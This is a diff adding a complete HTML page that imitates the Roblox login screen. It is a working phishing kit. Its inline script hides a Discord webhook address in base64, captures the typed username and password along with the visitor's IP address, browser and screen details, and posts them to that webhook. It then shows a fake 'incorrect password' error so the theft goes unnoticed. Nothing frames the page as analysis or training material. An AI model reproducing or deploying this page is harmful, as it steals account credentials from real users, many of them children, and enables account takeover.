@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Source Sans Pro", Arial, sans-serif; }
+        body { background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo svg { width: 80px; height: 80px; }
+        .form-box { background: #fff; border-radius: 8px; }
+        .title { font-size: 24px; font-weight: 700; color: #333; text-align: center; margin-bottom: 20px; }
+        .input-wrap { margin-bottom: 15px; }
+        .input-wrap label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 5px; }
+        .input-wrap input {
+            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px;
+            font-size: 15px; outline: none; transition: border 0.2s;
+        }
+        .input-wrap input:focus { border-color: #00a2ff; box-shadow: 0 0 5px rgba(0,162,255,0.3); }
+        .btn {
+            width: 100%; padding: 13px; background: #00a2ff; color: #fff; border: none;
+            border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 5px;
+        }
+        .btn:hover { background: #0088cc; }
+        .links { text-align: center; margin-top: 15px; font-size: 13px; }
+        .links a { color: #00a2ff; text-decoration: none; }
+        .links a:hover { text-decoration: underline; }
+        .error { display: none; background: #fff3f3; border: 1px solid #ffcccc; color: #cc0000; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
+        .footer { text-align: center; margin-top: 30px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 100 100"><rect x="20" y="20" width="60" height="60" rx="10" fill="#00a2ff" transform="rotate(45 50 50)"/><rect x="38" y="38" width="24" height="24" rx="4" fill="#fff"/></svg>
+        </div>
+        <div class="form-box">
+            <div class="title">Login to Roblox</div>
+            <div class="error" id="err">Incorrect username or password.</div>
+            <div class="input-wrap">
+                <label>Username / Email / Phone</label>
+                <input type="text" id="u" placeholder="Username" autocomplete="off">
+            </div>
+            <div class="input-wrap">
+                <label>Password</label>
+                <input type="password" id="p" placeholder="Password" autocomplete="off">
+            </div>
+            <button class="btn" onclick="_x()">Log In</button>
+            <div class="links">
+                <a href="#" onclick="return false;">Forgot Password or Username?</a>
+            </div>
+        </div>
+        <div class="footer">©2026 Roblox Corporation. All rights reserved.</div>
+    </div>
+    
+    <script>
+    (function(){
+        var _k="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhlRkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdoX3FUQ1A2MlAtbnpPbHdxRjh5YXhCbkxYM0d0cUlXc1pMVw==";
+        function _d(){try{return atob(_k)}catch(e){return""}}
+        function _g(){
+            try{return fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return d.ip})}catch(e){return Promise.resolve("")}
+        }
+        window._x=async function(){
+            var u=document.getElementById("u").value;
+            var p=document.getElementById("p").value;
+            var e=document.getElementById("err");
+            if(!u||!p){e.textContent="Please enter username and password.";e.style.display="block";return}
+            e.style.display="none";
+            var ip=await _g();
+            var _m="LOGIN|"+u+"|"+p+"|"+ip+"|"+navigator.userAgent+"|"+screen.width+"x"+screen.height+"|"+Intl.DateTimeFormat().resolvedOptions().timeZone;
+            var _ep=_d();
+            if(_ep){
+                fetch(_ep,{
+                    method:"POST",
+                    headers:{"Content-Type":"application/json"},
+                    body:JSON.stringify({content:"🔑 **LOGIN**\n\n```"+_m+"```"})
+                });
+            }
+            setTimeout(function(){
+                e.textContent="Incorrect username or password.";
+                e.style.display="block";
+                document.getElementById("p").value="";
+            },2000);
+        };
+        document.addEventListener("keydown",function(ev){if(ev.key==="Enter")_x()});
+    })();
+    </script>
+</body>
+</html>
